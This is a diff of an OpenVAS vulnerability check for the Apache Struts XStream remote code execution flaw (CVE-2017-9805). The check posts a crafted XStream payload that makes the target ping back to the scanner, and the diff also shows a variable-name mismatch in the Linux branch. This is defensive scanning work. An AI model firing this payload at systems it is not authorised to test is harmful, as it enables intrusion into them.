@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_apache_struts_rest_plug_xstream_rce_vuln.nasl 13679 2019-02-15 08:20:11Z cfischer $
+# $Id: gb_apache_struts_rest_plug_xstream_rce_vuln.nasl 13994 2019-03-05 12:23:37Z cfischer $
 #
 # Apache Struts 'REST Plugin With XStream Handler' RCE Vulnerability
 #
@@ -30,12 +30,12 @@ CPE = "cpe:/a:apache:struts";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.811730");
-  script_version("$Revision: 13679 $");
+  script_version("$Revision: 13994 $");
   script_cve_id("CVE-2017-9805");
   script_bugtraq_id(100609);
   script_tag(name:"cvss_base", value:"6.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2019-02-15 09:20:11 +0100 (Fri, 15 Feb 2019) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
   script_tag(name:"creation_date", value:"2017-09-07 16:39:09 +0530 (Thu, 07 Sep 2017)");
   script_name("Apache Struts 'REST Plugin With XStream Handler' RCE Vulnerability");
   script_category(ACT_ATTACK);
@@ -71,18 +71,16 @@ if(description)
   script_tag(name:"qod_type", value:"exploit");
 
   script_xref(name:"URL", value:"http://struts.apache.org");
+
   exit(0);
 }
 
 include("http_func.inc");
 include("misc_func.inc");
-
 include("host_details.inc");
 
 port = get_http_port(default:8080);
-
 host = http_host_name(dont_add_port:TRUE);
-vtstring = get_vt_string();
 
 foreach ext(make_list("action", "do", "jsp")){
   exts = http_get_kb_file_extensions(port:port, host:host, ext:ext);
@@ -92,23 +90,23 @@ foreach ext(make_list("action", "do", "jsp")){
   }
 }
 
-if( ! found ) exit( 0 );
+if( ! found )
+  exit( 0 );
 
 host = http_host_name(port:port);
-
 soc = open_sock_tcp(port);
-if(!soc){
+if(!soc)
   exit(0);
-}
 
 if(host_runs("Windows") == "yes"){
-  COMMAND = '<string>ping</string><string>-n</string><string>3</string><string>'+ this_host() + '</string>';
+  COMMAND = '<string>ping</string><string>-n</string><string>3</string><string>' + this_host() + '</string>';
   win = TRUE;
 }else{
   ##For Linux and Unix platform
-  check = "__" + vtstring + "__" + rand_str(length:4);
+  vtstrings = get_vt_strings();
+  check = vtstring["ping_string"];
   pattern = hexstr(check);
-  COMMAND = '<string>ping</string><string>-c</string><string>3</string><string>-p</string><string>' + pattern + '</string><string>'+ this_host() + '</string>';
+  COMMAND = '<string>ping</string><string>-c</string><string>3</string><string>-p</string><string>' + pattern + '</string><string>' + this_host() + '</string>';
 }
 
 data =
@@ -167,10 +165,6 @@ data =
 				</entry>
 				</map>';
 len = strlen(data);
-if(!len){
-  exit(0);
-}
-
 url = '/struts2-rest-showcase/orders/3';
 req = http_post_req( port: port,
                      url: url,
@@ -185,8 +179,8 @@ close(soc);
 
 if(res && (win || check >< res)){
   report = "It was possible to execute command remotely at " + report_vuln_url( port:port, url:url, url_only:TRUE ) + " with the command '" + COMMAND + "'.";
-  security_message( port:port, data:report);
+  security_message(port:port, data:report);
   exit(0);
 }
 
-exit(0);
+exit(99);
